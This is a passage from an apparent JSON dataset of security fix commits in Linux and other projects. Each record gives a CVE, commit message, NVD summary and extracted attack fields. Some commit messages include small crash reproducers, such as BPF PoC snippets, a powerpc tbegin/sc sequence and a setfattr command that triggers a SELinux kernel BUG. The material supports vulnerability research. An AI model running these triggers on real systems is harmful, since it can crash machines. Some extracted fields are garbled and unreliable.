attacker"},{"commit_id":"e9c243a5a6de0be8e584c604d353412584b592f8","cve_id":"CVE-2014-3153","cwe_id":"CWE-264","commit_message":"futex-prevent-requeue-pi-on-same-futex.patch futex: Forbid uaddr == uaddr2 in futex_requeue(..., requeue_pi=1)\n\nIf uaddr == uaddr2, then we have broken the rule of only requeueing from\na non-pi futex to a pi futex with this call.  If we attempt this, then\ndangling pointers may be left for rt_waiter resulting in an exploitable\ncondition.\n\nThis change brings futex_requeue() in line with futex_wait_requeue_pi()\nwhich performs the same check as per commit 6f7b0a2a5c0f (\"futex: Forbid\nuaddr == uaddr2 in futex_wait_requeue_pi()\")\n\n[ tglx: Compare the resulting keys as well, as uaddrs might be\n  \tdifferent depending on the mapping ]\n\nFixes CVE-2014-3153.\n\nReported-by: Pinkie Pie\nSigned-off-by: Will Drewry <wad@chromium.org>\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nReviewed-by: Darren Hart <dvhart@linux.intel.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The futex_requeue function in kernel\/futex.c in the Linux kernel through 3.14.5 does not ensure that calls have two different futex addresses, which allows local users to gain privileges via a crafted FUTEX_REQUEUE command that facilitates unsafe waiter modification.","commit_message_1":"forbid uaddr == uaddr2 in futex_requeue (","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted futex _ requeue command that facilitates unsafe waiter modification","Impact":"gain privileges","Root Cause":"does not ensure that calls have two different futex addresses","Attack Type":"local attacker"},{"commit_id":"05ab8f2647e4221cbdb3856dd7d32bd5407316b3","cve_id":"CVE-2014-3145","cwe_id":"CWE-189","commit_message":"filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check\nfor a minimal message length before testing the supplied offset to be\nwithin the bounds of the message. This allows the subtraction of the nla\nheader to underflow and therefore -- as the data type is unsigned --\nallowing far to big offset and length values for the search of the\nnetlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is\nalso wrong. It has the minuend and subtrahend mixed up, therefore\ncalculates a huge length value, allowing to overrun the end of the\nmessage while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to\na UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nla\n | ret\ta\n `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--\n | ; (needs a fake netlink header at offset 0)\n | ld\t#0\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\nFix the first issue by ensuring the message length fulfills the minimal\nsize constrains of a nla header. Fix the second bug by getting the math\nfor the remainder calculation right.\n\nFixes: 4738c1db15 (\"[SKFILTER]: Add SKF_ADF_NLATTR instruction\")\nFixes: d214c7537b (\"filter: add SKF_AD_NLATTR_NEST to look for nested..\")\nCc: Patrick McHardy <kaber@trash.net>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The BPF_S_ANC_NLATTR_NEST extension implementation in the sk_run_filter function in net\/core\/filter.c in the Linux kernel through 3.14.3 uses the reverse order in a certain subtraction, which allows local users to cause a denial of service (over-read and system crash) via crafted BPF instructions.  NOTE: the affected code was moved to the __skb_get_nlattr_nest function before the vulnerability was announced.","commit_message_1":"prevent nla extension to peek beyond the end of the message the bpf_s_anc_nlattr and bpf_s_anc_nlattr_nest extension fail to check for a minimal message length before testing the supplied offset to be within the bound of the message","Vulnerability Type":"Numeric Errors","Attack Vector":"via crafted bpf instructions .","Impact":"cause a denial of service ( over - read and system crash )","Root Cause":"uses the reverse order","Attack Type":"local attacker"},{"commit_id":"57e68e9cd65b4b8eb4045a1e0d0746458502554c","cve_id":"CVE-2014-3122","cwe_id":"CWE-264","commit_message":"mm: try_to_unmap_cluster() should lock_page() before mlocking\n\nA BUG_ON(!PageLocked) was triggered in mlock_vma_page() by Sasha Levin\nfuzzing with trinity.  The call site try_to_unmap_cluster() does not lock\nthe pages other than its check_page parameter (which is already locked).\n\nThe BUG_ON in mlock_vma_page() is not documented and its purpose is\nsomewhat unclear, but apparently it serializes against page migration,\nwhich could otherwise fail to transfer the PG_mlocked flag.  This would\nnot be fatal, as the page would be eventually encountered again, but\nNR_MLOCK accounting would become distorted nevertheless.  This patch adds\na comment to the BUG_ON in mlock_vma_page() and munlock_vma_page() to that\neffect.\n\nThe call site try_to_unmap_cluster() is fixed so that for page !=\ncheck_page, trylock_page() is attempted (to avoid possible deadlocks as we\nalready have check_page locked) and mlock_vma_page() is performed only\nupon success.  If the page lock cannot be obtained, the page is left\nwithout PG_mlocked, which is again not a problem in the whole unevictable\nmemory design.\n\nSigned-off-by: Vlastimil Babka <vbabka@suse.cz>\nSigned-off-by: Bob Liu <bob.liu@oracle.com>\nReported-by: Sasha Levin <sasha.levin@oracle.com>\nCc: Wanpeng Li <liwanp@linux.vnet.ibm.com>\nCc: Michel Lespinasse <walken@google.com>\nCc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>\nAcked-by: Rik van Riel <riel@redhat.com>\nCc: David Rientjes <rientjes@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Hugh Dickins <hughd@google.com>\nCc: Joonsoo Kim <iamjoonsoo.kim@lge.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The try_to_unmap_cluster function in mm\/rmap.c in the Linux kernel before 3.14.3 does not properly consider which pages must be locked, which allows local users to cause a denial of service (system crash) by triggering a memory-usage pattern that requires removal of page-table mappings.","commit_message_1":"try_to_unmap_cluster ( ) should lock_page ( ) before mlocking a bug_on ( ! pagelocked ) wa triggered in mlock_vma_page ( ) by sasha levin fuzzing with trinity","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by triggering a memory - usage pattern that requires removal of page - table mappings","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly consider which pages must be locked","Attack Type":"local attacker"},{"commit_id":"b2853fd6c2d0f383dbdf7427e263eb576a633867","cve_id":"CVE-2014-2739","cwe_id":"CWE-20","commit_message":"IB\/core: Don't resolve passive side RoCE L2 address in CMA REQ handler\n\nThe code that resolves the passive side source MAC within the rdma_cm\nconnection request handler was both redundant and buggy, so remove it.\n\nIt was redundant since later, when an RC QP is modified to RTR state,\nthe resolution will take place in the ib_core module.  It was buggy\nbecause this callback also deals with UD SIDR exchange, for which we\nincorrectly looked at the REQ member of the CM event and dereferenced\na random value.\n\nFixes: dd5f03beb4f7 (\"IB\/core: Ethernet L2 attributes in verbs\/cm structures\")\nSigned-off-by: Moni Shoua <monis@mellanox.com>\nSigned-off-by: Or Gerlitz <ogerlitz@mellanox.com>\nSigned-off-by: Roland Dreier <roland@purestorage.com>","summary":"The cma_req_handler function in drivers\/infiniband\/core\/cma.c in the Linux kernel 3.14.x through 3.14.1 attempts to resolve an RDMA over Converged Ethernet (aka RoCE) address that is properly resolved within a different module, which allows remote attackers to cause a denial of service (incorrect pointer dereference and system crash) via crafted network traffic.","commit_message_1":"do n't resolve passive side roce l2 address in cma req handler the code that resolve the passive side source mac within the rdma_cm connection request handler wa both redundant and buggy , so remove it","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted network traffic","Impact":"cause a denial of service ( incorrect pointer dereference and system crash","Root Cause":"resolve an RDMA over Converged Ethernet (aka RoCE) address that is properly resolved within a different module","Attack Type":"remote attacker"},{"commit_id":"1d147bfa64293b2723c4fec50922168658e613ba","cve_id":"CVE-2014-2706","cwe_id":"CWE-362","commit_message":"mac80211: fix AP powersave TX vs. wakeup race\n\nThere is a race between the TX path and the STA wakeup: while\na station is sleeping, mac80211 buffers frames until it wakes\nup, then the frames are transmitted. However, the RX and TX\npath are concurrent, so the packet indicating wakeup can be\nprocessed while a packet is being transmitted.\n\nThis can lead to a situation where the buffered frames list\nis emptied on the one side, while a frame is being added on\nthe other side, as the station is still seen as sleeping in\nthe TX path.\n\nAs a result, the newly added frame will not be send anytime\nsoon. It might be sent much later (and out of order) when the\nstation goes to sleep and wakes up the next time.\n\nAdditionally, it can lead to the crash below.\n\nFix all this by synchronising both paths with a new lock.\nBoth path are not fastpath since they handle PS situations.\n\nIn a later patch we'll remove the extra skb queue locks to\nreduce locking overhead.\n\nBUG: unable to handle kernel\nNULL pointer dereference at 000000b0\nIP: [<ff6f1791>] ieee80211_report_used_skb+0x11\/0x3e0 [mac80211]\n*pde = 00000000\nOops: 0000 [#1] SMP DEBUG_PAGEALLOC\nEIP: 0060:[<ff6f1791>] EFLAGS: 00210282 CPU: 1\nEIP is at ieee80211_report_used_skb+0x11\/0x3e0 [mac80211]\nEAX: e5900da0 EBX: 00000000 ECX: 00000001 EDX: 00000000\nESI: e41d00c0 EDI: e5900da0 EBP: ebe458e4 ESP: ebe458b0\n DS: 007b ES: 007b FS: 00d8 GS: 00e0 SS: 0068\nCR0: 8005003b CR2: 000000b0 CR3: 25a78000 CR4: 000407d0\nDR0: 00000000 DR1: 00000000 DR2: 00000000 DR3: 00000000\nDR6: ffff0ff0 DR7: 00000400\nProcess iperf (pid: 3934, ti=ebe44000 task=e757c0b0 task.ti=ebe44000)\niwlwifi 0000:02:00.0: I iwl_pcie_enqueue_hcmd Sending command LQ_CMD (#4e), seq: 0x0903, 92 bytes at 3[3]:9\nStack:\n e403b32c ebe458c4 00200002 00200286 e403b338 ebe458cc c10960bb e5900da0\n ff76a6ec ebe458d8 00000000 e41d00c0 e5900da0 ebe458f0 ff6f1b75 e403b210\n ebe4598c ff723dc1 00000000 ff76a6ec e597c978 e403b758 00000002 00000002\nCall Trace:\n [<ff6f1b75>] ieee80211_free_txskb+0x15\/0x20 [mac80211]\n [<ff723dc1>] invoke_tx_handlers+0x1661\/0x1780 [mac80211]\n [<ff7248a5>] ieee80211_tx+0x75\/0x100 [mac80211]\n [<ff7249bf>] ieee80211_xmit+0x8f\/0xc0 [mac80211]\n [<ff72550e>] ieee80211_subif_start_xmit+0x4fe\/0xe20 [mac80211]\n [<c149ef70>] dev_hard_start_xmit+0x450\/0x950\n [<c14b9aa9>] sch_direct_xmit+0xa9\/0x250\n [<c14b9c9b>] __qdisc_run+0x4b\/0x150\n [<c149f732>] dev_queue_xmit+0x2c2\/0xca0\n\nCc: stable@vger.kernel.org\nReported-by: Yaara Rozenblum <yaara.rozenblum@intel.com>\nSigned-off-by: Emmanuel Grumbach <emmanuel.grumbach@intel.com>\nReviewed-by: Stanislaw Gruszka <sgruszka@redhat.com>\n[reword commit log, use a separate lock]\nSigned-off-by: Johannes Berg <johannes.berg@intel.com>","summary":"Race condition in the mac80211 subsystem in the Linux kernel before 3.13.7 allows remote attackers to cause a denial of service (system crash) via network traffic that improperly interacts with the WLAN_STA_PS_STA state (aka power-save mode), related to sta_info.c and tx.c.","commit_message_1":"fix ap powersave tx v","Vulnerability Type":"Race Condition","Attack Vector":"via network traffic that improperly interacts with the wlan _ sta _ ps _ sta state ( aka power - save mode ) , related to sta _ info . c and tx . c","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by a race condition between TX path and STA wakeup:","Attack Type":"remote attacker"},{"commit_id":"621b5060e823301d0cba4cb52a7ee3491922d291","cve_id":"CVE-2014-2673","cwe_id":"CWE-20","commit_message":"powerpc\/tm: Fix crash when forking inside a transaction\n\nWhen we fork\/clone we currently don't copy any of the TM state to the new\nthread.  This results in a TM bad thing (program check) when the new process is\nswitched in as the kernel does a tmrechkpt with TEXASR FS not set.  Also, since\nR1 is from userspace, we trigger the bad kernel stack pointer detection.  So we\nend up with something like this:\n\n   Bad kernel stack pointer 0 at c0000000000404fc\n   cpu 0x2: Vector: 700 (Program Check) at [c00000003ffefd40]\n       pc: c0000000000404fc: restore_gprs+0xc0\/0x148\n       lr: 0000000000000000\n       sp: 0\n      msr: 9000000100201030\n     current = 0xc000001dd1417c30\n     paca    = 0xc00000000fe00800   softe: 0        irq_happened: 0x01\n       pid   = 0, comm = swapper\/2\n   WARNING: exception is not recoverable, can't continue\n\nThe below fixes this by flushing the TM state before we copy the task_struct to\nthe clone.  To do this we go through the tmreclaim patch, which removes the\ncheckpointed registers from the CPU and transitions the CPU out of TM suspend\nmode.  Hence we need to call tmrechkpt after to restore the checkpointed state\nand the TM mode for the current task.\n\nTo make this fail from userspace is simply:\n\ttbegin\n\tli\tr0, 2\n\tsc\n\t<boom>\n\nKudos to Adhemerval Zanella Neto for finding this.\n\nSigned-off-by: Michael Neuling <mikey@neuling.org>\ncc: Adhemerval Zanella Neto <azanella@br.ibm.com>\ncc: stable@vger.kernel.org\nSigned-off-by: Benjamin Herrenschmidt <benh@kernel.crashing.org>","summary":"The arch_dup_task_struct function in the Transactional Memory (TM) implementation in arch\/powerpc\/kernel\/process.c in the Linux kernel before 3.13.7 on the powerpc platform does not properly interact with the clone and fork system calls, which allows local users to cause a denial of service (Program Check and system crash) via certain instructions that are executed with the processor in the Transactional state.","commit_message_1":"fix crash when forking inside a transaction when we fork\/clone we currently do n't copy any of the tm state to the new thread","Vulnerability Type":"Improper Input Validation","Attack Vector":"via certain instructions that are executed with the processor in the transactional state","Impact":"cause a denial of service ( program check and system crash )","Root Cause":"does not properly interact with the clone and fork system calls","Attack Type":"local attacker"},{"commit_id":"21f8aaee0c62708654988ce092838aa7df4d25d8","cve_id":"CVE-2014-2672","cwe_id":"CWE-362","commit_message":"ath9k: protect tid->sched check\n\nWe check tid->sched without a lock taken on ath_tx_aggr_sleep(). That\nis race condition which can result of doing list_del(&tid->list) twice\n(second time with poisoned list node) and cause crash like shown below:\n\n[424271.637220] BUG: unable to handle kernel paging request at 00100104\n[424271.637328] IP: [<f90fc072>] ath_tx_aggr_sleep+0x62\/0xe0 [ath9k]\n...\n[424271.639953] Call Trace:\n[424271.639998]  [<f90f6900>] ? ath9k_get_survey+0x110\/0x110 [ath9k]\n[424271.640083]  [<f90f6942>] ath9k_sta_notify+0x42\/0x50 [ath9k]\n[424271.640177]  [<f809cfef>] sta_ps_start+0x8f\/0x1c0 [mac80211]\n[424271.640258]  [<c10f730e>] ? free_compound_page+0x2e\/0x40\n[424271.640346]  [<f809e915>] ieee80211_rx_handlers+0x9d5\/0x2340 [mac80211]\n[424271.640437]  [<c112f048>] ? kmem_cache_free+0x1d8\/0x1f0\n[424271.640510]  [<c1345a84>] ? kfree_skbmem+0x34\/0x90\n[424271.640578]  [<c10fc23c>] ? put_page+0x2c\/0x40\n[424271.640640]  [<c1345a84>] ? kfree_skbmem+0x34\/0x90\n[424271.640706]  [<c1345a84>] ? kfree_skbmem+0x34\/0x90\n[424271.640787]  [<f809dde3>] ? ieee80211_rx_handlers_result+0x73\/0x1d0 [mac80211]\n[424271.640897]  [<f80a07a0>] ieee80211_prepare_and_rx_handle+0x520\/0xad0 [mac80211]\n[424271.641009]  [<f809e22d>] ? ieee80211_rx_handlers+0x2ed\/0x2340 [mac80211]\n[424271.641104]  [<c13846ce>] ? ip_output+0x7e\/0xd0\n[424271.641182]  [<f80a1057>] ieee80211_rx+0x307\/0x7c0 [mac80211]\n[424271.641266]  [<f90fa6ee>] ath_rx_tasklet+0x88e\/0xf70 [ath9k]\n[424271.641358]  [<f80a0f2c>] ? ieee80211_rx+0x1dc\/0x7c0 [mac80211]\n[424271.641445]  [<f90f82db>] ath9k_tasklet+0xcb\/0x130 [ath9k]\n\nBug report:\nhttps:\/\/bugzilla.kernel.org\/show_bug.cgi?id=70551\n\nReported-and-tested-by: Max Sydorenko <maxim.stargazer@gmail.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Stanislaw Gruszka <sgruszka@redhat.com>\nSigned-off-by: John W. Linville <linville@tuxdriver.com>","summary":"Race condition in the ath_tx_aggr_sleep function in drivers\/net\/wireless\/ath\/ath9k\/xmit.c in the Linux kernel before 3.13.7 allows remote attackers to cause a denial of service (system crash) via a large amount of network traffic that triggers certain list deletions.","commit_message_1":"protect tid- > sched check we check tid- > sched without a lock taken on ath_tx_aggr_sleep ( )","Vulnerability Type":"Race Condition","Attack Vector":"via a large amount of network traffic that triggers certain list deletions","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by a race condition","Attack Type":"remote attacker"},{"commit_id":"31400a673325147e1205326008e32135a78b4d8a","cve_id":"CVE-2014-2669","cwe_id":"CWE-189","commit_message":"Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064","summary":"Multiple integer overflows in contrib\/hstore\/hstore_io.c in PostgreSQL 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact via vectors related to the (1) hstore_recv, (2) hstore_from_arrays, and (3) hstore_from_array functions in contrib\/hstore\/hstore_io.c; and the (4) hstoreArrayToPairs function in contrib\/hstore\/hstore_op.c, which triggers a buffer overflow.  NOTE: this issue was SPLIT from CVE-2014-0064 because it has a different set of affected versions.","commit_message_1":"predict integer overflow to avoid buffer overrun","Vulnerability Type":"integer overflow","Attack Vector":"via vectors related to thehstore _ recv ,hstore _ from _ arrays , and hstore _ from _ array functions in","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by multiple integer overflow errors within hstore_io.c","Attack Type":"remote attacker"},{"commit_id":"25fffa3e25cbad85bbca804193ad336b090a9ce1","cve_id":"CVE-2014-2567","cwe_id":"CWE-200","commit_message":"IMAP: refuse to work when STARTTLS is required but server sends PREAUTH\n\nOops, we cannot send STARTTLS when the connection is already authenticated.\nThis is serious enough to warrant an error; an attacker might be going after a\nplaintext of a message we're going to APPEND, etc.\n\nThanks to Arnt Gulbrandsen on the imap-protocol ML for asking what happens when\nwe're configured to request STARTTLS and a PREAUTH is received, and to Michael M\nSlusarz for starting that discussion.\n\nHope the error message is readable enough.\n\nCVE: CVE-2014-2567","summary":"The OpenConnectionTask::handleStateHelper function in Imap\/Tasks\/OpenConnectionTask.cpp in Trojita before 0.4.1 allows man-in-the-middle attackers to trigger use of cleartext for saving a message into a (1) sent or (2) draft folder via a PREAUTH response that prevents later use of the STARTTLS command.","commit_message_1":"refuse to work when starttls is required but server sends preauth oops , we can not send starttls when the connection is already authenticated","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a preauth response that prevents later use of the starttls command","Impact":"trigger use of cleartext for saving a message into a sent or draft folder","Root Cause":"caused by the transmittal of information","Attack Type":"remote attacker"},{"commit_id":"b22f5126a24b3b2f15448c3f2a254fc10cbc2b92","cve_id":"CVE-2014-2523","cwe_id":"CWE-20","commit_message":"netfilter: nf_conntrack_dccp: fix skb_header_pointer API usages\n\nSome occurences in the netfilter tree use skb_header_pointer() in\nthe following way ...\n\n  struct dccp_hdr _dh, *dh;\n  ...\n  skb_header_pointer(skb, dataoff, sizeof(_dh), &dh);\n\n... where dh itself is a pointer that is being passed as the copy\nbuffer. Instead, we need to use &_dh as the forth argument so that\nwe're copying the data into an actual buffer that sits on the stack.\n\nCurrently, we probably could overwrite memory on the stack (e.g.\nwith a possibly mal-formed DCCP packet), but unintentionally, as\nwe only want the buffer to be placed into _dh variable.\n\nFixes: 2bc780499aa3 (\"[NETFILTER]: nf_conntrack: add DCCP protocol support\")\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"net\/netfilter\/nf_conntrack_proto_dccp.c in the Linux kernel through 3.13.6 uses a DCCP header pointer incorrectly, which allows remote attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a DCCP packet that triggers a call to the (1) dccp_new, (2) dccp_packet, or (3) dccp_error function.","commit_message_1":"nf_conntrack_dccp : fix skb_header_pointer api usage some occurences in the netfilter tree use skb_header_pointer ( ) in the following way","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a dccp packet that triggers a call to the dccp _ new ,dccp _ packet , or dccp _ error function","Impact":"cause a denial of service ( system crash ) or possibly execute arbitrary code","Root Cause":"uses a dccp header pointer incorrectly","Attack Type":"remote attacker"},{"commit_id":"447558595a3650db2886cd2f416ad0beba965801","cve_id":"CVE-2014-2270","cwe_id":"CWE-119","commit_message":"PR\/313: Aaron Reffett: Check properly for exceeding the offset.","summary":"softmagic.c in file before 5.17 and libmagic allows context-dependent attackers to cause a denial of service (out-of-bounds memory access and crash) via crafted offsets in the softmagic of a PE executable.","commit_message_1":"pr\/<number> : aaron reffett : check properly for exceeding the offset","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted offsets in the softmagic of a pe executable","Impact":"cause a denial of service ( out - of - bounds memory access and crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"851fff90a9b7461df2393af32239ba217bc25946","cve_id":"CVE-2014-2209","cwe_id":"CWE-264","commit_message":"Drop supplementary groups when changing to non-root\n\nSummary: When running HHVM as a non-root user, UID and GID are updated correctly but supplementary groups are not dropped properly. This runs initgroups inside main thread and lightprocess threads to reset groups to those of the specified non-root user.\n\nReviewed By: @markw65\n\nDifferential Revision: D1193229","summary":"Facebook HipHop Virtual Machine (HHVM) before 3.1.0 does not drop supplemental group memberships within hphp\/util\/capability.cpp and hphp\/util\/light-process.cpp, which allows remote attackers to bypass intended access restrictions by leveraging group permissions for a file or directory.","commit_message_1":"drop supplementary group when changing to non-root summary : when running hhvm a a non-root user , uid and gid are updated correctly but supplementary group are not dropped properly","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging group permissions for a file or directory","Impact":"bypass intended access restrictions","Root Cause":"does not drop supplemental group memberships within hphp \/ util \/ capability . cpp and hphp \/ util \/ light - process . cpp","Attack Type":"remote attacker"},{"commit_id":"506a44194a9016406c752ad8e010c01aeffc18cc","cve_id":"CVE-2014-2208","cwe_id":"CWE-94","commit_message":"Fix escaping in LightProcess protocol\n\nThe LightProcess mechanism sends newline terminated commands\nover a pipe, but didn't escape newlines contained in the payload.\n\nReviewed By: otto\n\nDifferential Revision: D1184482","summary":"CRLF injection vulnerability in the LightProcess protocol implementation in hphp\/util\/light-process.cpp in Facebook HipHop Virtual Machine (HHVM) before 2.4.2 allows remote attackers to execute arbitrary commands by entering a n (newline) character before the end of a string.","commit_message_1":"fix escaping in lightprocess protocol the lightprocess mechanism sends newline terminated command over a pipe , but did n't escape newlines contained in the payload","Vulnerability Type":"Code Injection","Attack Vector":"by entering a n ( newline ) character before the end of a string","Impact":"execute arbitrary commands","Root Cause":"caused by an error when processing the command string","Attack Type":"remote attacker"},{"commit_id":"263b4509ec4d47e0da3e753f85a39ea12d1eff24","cve_id":"CVE-2014-2038","cwe_id":"CWE-20","commit_message":"nfs: always make sure page is up-to-date before extending a write to cover the entire page\n\nWe should always make sure the cached page is up-to-date when we're\ndetermining whether we can extend a write to cover the full page -- even\nif we've received a write delegation from the server.\n\nCommit c7559663 added logic to skip this check if we have a write\ndelegation, which can lead to data corruption such as the following\nscenario if client B receives a write delegation from the NFS server:\n\nClient A:\n    # echo 123456789 > \/mnt\/file\n\nClient B:\n    # echo abcdefghi >> \/mnt\/file\n    # cat \/mnt\/file\n    0\ufffdD0\ufffdabcdefghi\n\nJust because we hold a write delegation doesn't mean that we've read in\nthe entire page contents.\n\nCc: <stable@vger.kernel.org> # v3.11+\nSigned-off-by: Scott Mayhew <smayhew@redhat.com>\nSigned-off-by: Trond Myklebust <trond.myklebust@primarydata.com>","summary":"The nfs_can_extend_write function in fs\/nfs\/write.c in the Linux kernel before 3.13.3 relies on a write delegation to extend a write operation without a certain up-to-date verification, which allows local users to obtain sensitive information from kernel memory in opportunistic circumstances by writing to a file in an NFS filesystem and then reading the same file.","commit_message_1":"always make sure page is up-to-date before extending a write to cover the entire page we should always make sure the cached page is up-to-date when we 're determining whether we can extend a write to cover the full page -- even if we 've received a write delegation from the server","Vulnerability Type":"Improper Input Validation","Attack Vector":"by writing to a file in an nfs filesystem and then reading the same file","Impact":"obtain sensitive information from kernel memory in opportunistic circumstances","Root Cause":"relies on a write delegation to extend a write operation without a certain up-to-date verification","Attack Type":"local attacker"},{"commit_id":"2938329ce19cb8c4197dec146c3ec887c6f61d01","cve_id":"CVE-2014-2020","cwe_id":"CWE-189","commit_message":"Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop())\n\nAnd also fixed the bug: arguments are altered after some calls","summary":"ext\/gd\/gd.c in PHP 5.5.x before 5.5.9 does not check data types, which might allow remote attackers to obtain sensitive information by using a (1) string or (2) array data type in place of a numeric data type, as demonstrated by an imagecrop function call with a string for the x dimension value, a different vulnerability than CVE-2013-7226.","commit_message_1":"fixed bug # <number> ( heap overflow vulnerability in imagecrop ( ) )","Vulnerability Type":"Numeric Errors","Attack Vector":"by using a string or array data type in place of a numeric data type , as demonstrated by an imagecrop function call with a string for the x dimension value , a different vulnerability than cve - 2013 - 7226","Impact":"obtain sensitive information","Root Cause":"does not check data types ","Attack Type":"remote attacker"},{"commit_id":"2172fa709ab32ca60e86179dc67d0857be8e2c98","cve_id":"CVE-2014-1874","cwe_id":"CWE-20","commit_message":"SELinux:  Fix kernel BUG on empty security contexts.\n\nSetting an empty security context (length=0) on a file will\nlead to incorrectly dereferencing the type and other fields\nof the security context structure, yielding a kernel BUG.\nAs a zero-length security context is never valid, just reject\nall such security contexts whether coming from userspace\nvia setxattr or coming from the filesystem upon a getxattr\nrequest by SELinux.\n\nSetting a security context value (empty or otherwise) unknown to\nSELinux in the first place is only possible for a root process\n(CAP_MAC_ADMIN), and, if running SELinux in enforcing mode, only\nif the corresponding SELinux mac_admin permission is also granted\nto the domain by policy.  In Fedora policies, this is only allowed for\nspecific domains such as livecd for setting down security contexts\nthat are not defined in the build host policy.\n\nReproducer:\nsu\nsetenforce 0\ntouch foo\nsetfattr -n security.selinux foo\n\nCaveat:\nRelabeling or removing foo after doing the above may not be possible\nwithout booting with SELinux disabled.  Any subsequent access to foo\nafter doing the above will also trigger the BUG.\n\nBUG output from Matthew Thode:\n[  473.893141] ------------[ cut here ]------------\n[  473.962110] kernel BUG at security\/selinux\/ss\/services.c:654!\n[  473.995314] invalid opcode: 0000 [#6] SMP\n[  474.027196] Modules linked in:\n[  474.058118] CPU: 0 PID: 8138 Comm: ls Tainted: G      D   I\n3.13.0-grsec #1\n[  474.116637] Hardware name: Supermicro X8ST3\/X8ST3, BIOS 2.0\n07\/29\/10\n[  474.149768] task: ffff8805f50cd010 ti: ffff8805f50cd488 task.ti:\nffff8805f50cd488\n[  474.183707] RIP: 0010:[<ffffffff814681c7>]  [<ffffffff814681c7>]\ncontext_struct_compute_av+0xce\/0x308\n[  474.219954] RSP: 0018:ffff8805c0ac3c38  EFLAGS: 00010246\n[  474.252253] RAX: 0000000000000000 RBX: ffff8805c0ac3d94 RCX:\n0000000000000100\n[  474.287018] RDX: ffff8805e8aac000 RSI: 00000000ffffffff RDI:\nffff8805e8aaa000\n[  474.321199] RBP: ffff8805c0ac3cb8 R08: 0000000000000010 R09:\n0000000000000006\n[  474.357446] R10: 0000000000000000 R11: ffff8805c567a000 R12:\n0000000000000006\n[  474.419191] R13: ffff8805c2b74e88 R14: 00000000000001da R15:\n0000000000000000\n[  474.453816] FS:  00007f2e75220800(0000) GS:ffff88061fc00000(0000)\nknlGS:0000000000000000\n[  474.489254] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  474.522215] CR2: 00007f2e74716090 CR3: 00000005c085e000 CR4:\n00000000000207f0\n[  474.556058] Stack:\n[  474.584325]  ffff8805c0ac3c98 ffffffff811b549b ffff8805c0ac3c98\nffff8805f1190a40\n[  474.618913]  ffff8805a6202f08 ffff8805c2b74e88 00068800d0464990\nffff8805e8aac860\n[  474.653955]  ffff8805c0ac3cb8 000700068113833a ffff880606c75060\nffff8805c0ac3d94\n[  474.690461] Call Trace:\n[  474.723779]  [<ffffffff811b549b>] ? lookup_fast+0x1cd\/0x22a\n[  474.778049]  [<ffffffff81468824>] security_compute_av+0xf4\/0x20b\n[  474.811398]  [<ffffffff8196f419>] avc_compute_av+0x2a\/0x179\n[  474.843813]  [<ffffffff8145727b>] avc_has_perm+0x45\/0xf4\n[  474.875694]  [<ffffffff81457d0e>] inode_has_perm+0x2a\/0x31\n[  474.907370]  [<ffffffff81457e76>] selinux_inode_getattr+0x3c\/0x3e\n[  474.938726]  [<ffffffff81455cf6>] security_inode_getattr+0x1b\/0x22\n[  474.970036]  [<ffffffff811b057d>] vfs_getattr+0x19\/0x2d\n[  475.000618]  [<ffffffff811b05e5>] vfs_fstatat+0x54\/0x91\n[  475.030402]  [<ffffffff811b063b>] vfs_lstat+0x19\/0x1b\n[  475.061097]  [<ffffffff811b077e>] SyS_newlstat+0x15\/0x30\n[  475.094595]  